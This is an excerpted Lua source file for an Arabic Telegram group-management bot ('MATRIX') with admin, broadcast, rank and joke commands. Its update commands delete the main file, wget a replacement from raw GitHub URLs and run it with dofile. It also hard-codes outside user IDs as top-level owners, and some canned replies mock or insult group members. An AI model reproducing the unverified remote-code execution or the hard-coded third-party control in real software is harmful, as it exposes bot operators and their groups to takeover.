...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MATRIXTEAM/Files_Boyka/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1019610884,11,1106781321,8888888888}   
...
if hash or SudoBot(msg) or DevMATRIXW(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevMATRIXW(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevMATRIXW(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevMATRIXW(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMATRIXW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMATRIXW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevMATRIXW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
if tonumber(user_id) == tonumber(1019610884) then  
var = true  
elseif tonumber(user_id) == tonumber(11) then
var = true 
elseif tonumber(user_id) == tonumber(1106781321) then
var = true  
elseif tonumber(user_id) == tonumber(8888888888) then
var = true
...
local UserName = (data.username_ or "SOURCE_MATRIX")
...
if DevMATRIXW(msg) then
local bl = ' ✧ اهلا عزيزي آلمـطـور\n ✧ آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n ✧ تسـتطـيع‌‏ آلتحگم باوامر البوت\n ✧ من خلاال الكيبورت خاص بك\n ✧ قناة سورس البوت [اضغط هنا](t.me/SOURCE_MATRIX)'
local keyboard = {
{'الاحصائيات ✧','المبرمجين ✧'},
...
if not DevMATRIXW(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevMATRIXW(msg) and msg.reply_to_message_id_ ~= 0  then    
...
if text == 'تفعيل التواصل ✧' and DevMATRIXW(msg) then  
...
if text == 'تعطيل التواصل ✧' and DevMATRIXW(msg) then  
...
if text == 'تفعيل البوت الخدمي ✧' and DevMATRIXW(msg) then  
...
if text == 'تعطيل البوت الخدمي ✧' and DevMATRIXW(msg) then  
...
if text == 'ضع كليشه ستارت ✧' and DevMATRIXW(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ✧ ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه ستارت ✧' and DevMATRIXW(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ✧ تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر ✧' and DevMATRIXW(msg) then 
...
if text == 'تحديث السورس ✧' and DevMATRIXW(msg) then 
os.execute('rm -rf MATRIX.lua')
os.execute('wget https://raw.githubusercontent.com/daaarkkk00/d/master/MATRIX.lua')
send(msg.chat_id_, msg.id_,' ✧ تم تحديث السورس \n ✧ لديك اخر اصدار لسورس ماتركس\n ✧ الاصدار » { 1.1v}')
dofile('MATRIX.lua')  
end
if text == 'الاصدار ✧' and DevMATRIXW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ✧ اصدار سورس ماتركس \n ✧ الاصدار »{ 1.1v}')
end
if text == 'المبرمجين ✧' and DevMATRIXW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ✧ [المبرمج تركي✨](https://t.me/M2ttt) \n ✧ [المالك احمد✨](https://t.me/TGGTTT)')
end
if text == "ضع اسم للبوت ✧" and DevMATRIXW(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ✧ ارسل اليه الاسم الان ")
return false
end
if text == 'الاحصائيات ✧' and DevMATRIXW(msg) then 
...
if text == 'المشتركين ✧' and DevMATRIXW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ✧ المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'المجموعات ✧' and DevMATRIXW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ✧ المجموعات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين ✧") and DevMATRIXW(msg) then
...
if text == ("قائمه العام ✧") and DevMATRIXW(msg) then
...
if text == ("قائمه الكتم العام ✧") and DevMATRIXW(msg) then
...
if text=="اذاعه خاص ✧" and msg.reply_to_message_id_ == 0 and DevMATRIXW(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✧ ارسل الان اذاعتك؟ \n ✧ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه ✧" and msg.reply_to_message_id_ == 0 and DevMATRIXW(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✧ ارسل الان اذاعتك؟ \n ✧ للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت ✧" and msg.reply_to_message_id_ == 0 and DevMATRIXW(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✧ ارسل الان اذاعتك؟ \n ✧ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه ✧" and msg.reply_to_message_id_ == 0  and DevMATRIXW(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✧ ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص ✧" and msg.reply_to_message_id_ == 0  and DevMATRIXW(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ✧ ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه ✧' and DevMATRIXW(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ✧" and DevMATRIXW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "تنظيف المجموعات ✧" and DevMATRIXW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_,'✧  عدد المجموعات الان » { '..#group..' }'..MATRIXk..''..MATRIX..'\n✧  الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevMATRIXW(msg) then
...
usertext = '\n ✧ العضو » ['..result.title_..'](t.me/'..(username or 'SOURCE_MATRIX')..')'
status  = '\n ✧ تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevMATRIXW(msg) then
...
usertext = '\n ✧ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE_MATRIX')..')'
status  = '\n ✧ تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevMATRIXW(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevMATRIXW(msg) then
...
if MATRIX1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ✧ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOURCE_MATRIX')..') \n ✧ '..MATRIX1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ✧ العضو : {["..data.first_name_.."](https://t.me/SourceMatrix)}\n ✧ ["..MATRIX_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ✧ عذرا » {["..data.first_name_.."](https://t.me/SourceMatrix)}\n ✧ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevMATRIXW(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevMATRIXW(msg) then
...
os.execute('rm -rf MATRIX.lua')
os.execute('wget https://raw.githubusercontent.com/daaarkkk0012512000/spees/master/MATRIX.lua')
send(msg.chat_id_, msg.id_,' ✧ تم تحديث السورس \n ✧ لديك اخر اصدار لسورس ماتركس\n ✧ الاصدار » { 1.1v}')
dofile('MATRIX.lua')  
end
...
if name_Boyka then 
names_Boyka = database:smembers(bot_id.."MATRIX:blocname"..msg.chat_id_) or ""
...
if Boyka2.first_name_:match("(.*)"..database:get(bot_id.."MATRIX:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."MATRIX:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local Boyka_nnn = database:get(bot_id.."MATRIX:nump"..msg.chat_id_) or 5
local Boyka_nnn2 = database:get(bot_id.."MATRIX:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
...
send(msg.chat_id_, msg.id_, " كان معرف حلو جدا ["..MATRIXChengName..']')
...
send(msg.chat_id_, msg.id_, 1, "حذف معرفه  اسرقوه \n ده معرفه  : [@"..MATRIXChengUserName..']')
...
"غيرت معرفك/لي يسط",
"معرف جديد😐🌝",
"غير معرفه اسرقوه \n ده معرفه : @"..data.username_.."",
'اي غيرت \n معرفك لي @'..data.username_..' ',
'عايز اشتري معرفك الجديد', 
...
send(msg.chat_id_, msg.id_, "بمت انت شيلت كل صورك لي😂😂🤫")
...
[ᴅᴇᴠ¹](https://https://t.me/M2ttt)

[ᴅᴇᴠ²](https://t.me/TGGTTT)

[ᴛᴏ ᴛᴡѕʟ ғᴏʀ ʙᴏᴛ](http://t.me/TwslMtbot)

[ѕᴏụʀᴄᴇᴄʜ](http://t.me/SourceMatrix)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
if text == 'رفع نسخه الاحتياطيه' and DevMATRIXW(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ✧ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOURCE_MATRIX')..') \n ✧ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ✧ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SOURCE_MATRIX')..') \n ✧ تـم قفـل التاك بالكتم ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and DevMATRIXW(msg) then    
dofile('MATRIX.lua')  
send(msg.chat_id_, msg.id_, ' ✧ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevMATRIXW(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevMATRIXW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^حظر عام @(.*)$")  and DevMATRIXW(msg) then
...
if text and text:match("^حظر عام (%d+)$") and DevMATRIXW(msg) then
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevMATRIXW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevMATRIXW(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevMATRIXW(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevMATRIXW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevMATRIXW(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevMATRIXW(msg) then
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevMATRIXW(msg) then
...
if text == 'الملفات' and DevMATRIXW(msg) then
...
if DevMATRIXW(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/MATRIXTEAM/Files_Boyka/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ✧ اهلا بك في متجر ملفات ماتركس\n ✧ ملفات السورس ↓\n♡♡ᴍᴀᴛʀɪх♡♡\n\n"
local TextE = "\n♡♡ᴍᴀᴛʀɪх♡♡\n ✧ علامة تعني { ✓ } ملف مفعل\n ✧ علامة تعني { ✘ } ملف معطل\n ✧ قناة سورس ماتركس ↓\n".." ✧ [اضغط هنا لدخول](t.me/SOURCE_MATRIX) \n"
local NumFile = 0
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevMATRIXW(msg) then
...
local json_file, res = https.request("https://raw.githubusercontent.com/MATRIXTEAM/Files_Boyka/master/File_Bot/"..file)
if res == 200 then
...
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevMATRIXW(msg) then
...
if text == "مسح الملفات" and DevMATRIXW(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ✧ تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevMATRIXW(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevMATRIXW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local UserName = (b.username_ or "SOURCE_MATRIX")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ✧ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE_MATRIX')..')'
status  = '\n ✧ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ✧ العضو » '..userid..''
...
local  statuss  = '\n ✧ تم رفع العضــو الحاته في المجموعه \n ✧ تعال يحاته ممكن نتعرف'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✧ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE_MATRIX')..')'
status  = '\n ✧ تم تنزيل العضــو الحاته من المجموعه\n ✧ مشيي مو خوش حاتهه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✧ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ✧ تم رفع العضــو الحات في المجموعه \n ✧ تعال حبي الحات نطيني بوسه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✧ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE_MATRIX')..')'
status  = '\n ✧ تم تنزيل العضــو الحات من المجموعه\n ✧ مشيي مو خوش حات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if text == 'مسح كليشه المطور' and DevMATRIXW(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' ✧ تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and DevMATRIXW(msg) then
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ✧ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'SOURCE_MATRIX')..')'..'\n ✧ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'تفعيل الاذاعه' and DevMATRIXW(msg) then  
...
if text == 'تعطيل الاذاعه' and DevMATRIXW(msg) then  
...
if database:get(bot_id..'Bc:Bots') and not DevMATRIXW(msg) then 
...
if text == ("مسح ردود المطور") and DevMATRIXW(msg) then 
...
if text == ("ردود المطور") and DevMATRIXW(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ✧ قائمة ردود المطور \n♡♡ᴍᴀᴛʀɪх♡♡\n"
for k,v in pairs(list) do
...
if text == 'اضف رد عام' and DevMATRIXW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'مسح رد عام' and DevMATRIXW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'تفعيل المغادره' and DevMATRIXW(msg) then   
...
if text == 'تعطيل المغادره' and DevMATRIXW(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'SOURCE_MATRIX')..')'
local iduser = result.sender_user_id_
...
if result.id_ then
send(msg.chat_id_, msg.id_,' ✧ تع يسط فضحتك ف الروم [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
...
send(msg.chat_id_, msg.id_, '\n You do not have photos in your account \n['..get_id_text..']')      
end 
end
else
if result.username_ then
...
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, amir.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n • YOUR ID 🇮🇹 : '..msg.sender_user_id_..'\n • YOUR USERNAME 🇮🇹 : '..username..'\n • YOUR RANK 🇮🇹 : '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n • YOUR SITE 🇮🇹 : '..rtpa..'\n • YOUR INTERACTIOM 🇮🇹 : '..Total_Msg(Msguser)..'\n • YOUR MESSAGES 🇮🇹 : '..Msguser..'\n • YOUR ENGAGEMENT RATE 🇮🇹 : '..string.sub(nspatfa, 1,5)..' %\n • YOUR ADJUSTMENTS 🇮🇹 : '..edit..'\n • YOUR POINTS 🇮🇹 : '..NUMPGAME..'\n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n • YOUR ID 🇮🇹 : '..msg.sender_user_id_..'\n • YOUR USERNAME 🇮🇹 : '..username..'\n • YOUR RANK 🇮🇹 : '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n • YOUR SITE 🇮🇹 : '..rtpa..'\n • YOUR INTERACTIOM 🇮🇹 : '..Total_Msg(Msguser)..'\n • YOUR MESSAGES 🇮🇹 : '..Msguser..'\n • YOUR ENGAGEMENT RATE 🇮🇹 : '..string.sub(nspatfa, 1,5)..' %\n • YOUR ADJUSTMENTS 🇮🇹 : '..edit..'\n • YOUR POINTS 🇮🇹 : '..NUMPGAME..']\n')
else
send(msg.chat_id_, msg.id_, '\n • Image 🇮🇹 : You do not have photos in your account'..'[\n  : '..msg.sender_user_id_..'\n • YOUR USERNAME 🇮🇹 : '..username..'\n • YOUR RANK 🇮🇹 : '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n • YOUR SITE 🇮🇹 : '..rtpa..'\n • YOUR INTERACTIOM 🇮🇹 : '..Total_Msg(Msguser)..'\n • YOUR MESSAGES 🇮🇹 : '..Msguser..'\n • YOUR ENGAGEMENT RATE 🇮🇹 : '..string.sub(nspatfa, 1,5)..' %\n • YOUR ADJUSTMENTS 🇮🇹 : '..edit..'\n • YOUR POINTS 🇮🇹 : '..NUMPGAME..']\n')
end 
end
end
else
...
if text == 'استعاده الاوامر' and DevMATRIXW(msg) then
...
✧اهلا بك في قائمه اوامر البوت
             ✧ᴍᴀᴛʀɪх✧
✧م 1 ⇦ اوامر الحمايه
✧م 2 ⇦ اوامر تعطيل - تفعيل
✧م 3 ⇦ اوامر ضع - اضف
✧م 4 ⇦ اوامر مسح - حذف
✧م 5 ⇦ اوامر تنزيل-رفع-التغير
✧م 6 ⇦ اوامر المجموعه
✧م 7 ⇦ اوامر التسليه
✧م 8 ⇦ اوامر مطور البوت
✧م 9 ⇦ اوامر المطور الاساسي
✧م 10 ⇦ اوامر الاعضاء
             ✧ᴍᴀᴛʀɪх✧
彡 .[-ᴍᴀᴛʀɪх ᴄʜ](t.me/SOURCE_MATRIX)➢ 
]]
...
send(msg.chat_id_, msg.id_, t..'ٴ✧ٴ♡♡ᴍᴀᴛʀɪх♡♡ٴ✧○ٴ\n✧ 彡 .[-ᴍᴀᴛʀɪх ᴄʜ](t.me/SOURCE_MATRIX)➢ ')
end
...
local texting = {"بيشوف صور بنات الروم🥺"," مش عاجبني","فكك😹"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "شنو رئيك بهاي" or text == "شنو رئيك بهايي" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"جمدان❤️","عايزها يوم😂🙂","حقيره"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "هينه" or text == "نيكو" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"مش بنهين كلاب!!","مش مستاهله","ده خول فكك منو"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "مصه" or text == "بوسه" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"مووووووووواححح????","مش هبوس لا😂😂","خدك/ج نضيف 😂","لا كفايه😂☹️","مش هبوس ده لا😂🙂","كل شويه ابوسه كافي 😏","وربي مش هبوسه","لي??"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
local Fun = {'مكسل اشوف صورته 😒','عسل 💋🙄','بيلعب ع البنات 🙄', 'ده قامد' } 
...
function FunBot(extra, result, success) 
local Fun = {'مش بحبه لا ','تء ت ',' لٱ ','ده مش بيتحب 💔','لا طبعا','عمري ما حبيتو  ','بموت فيه ','ععععععع','بعشقو','بحبو فشخ','لا','لٱ',' بالله مش بحبو ','بحبو❤',' حبيبي دا' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
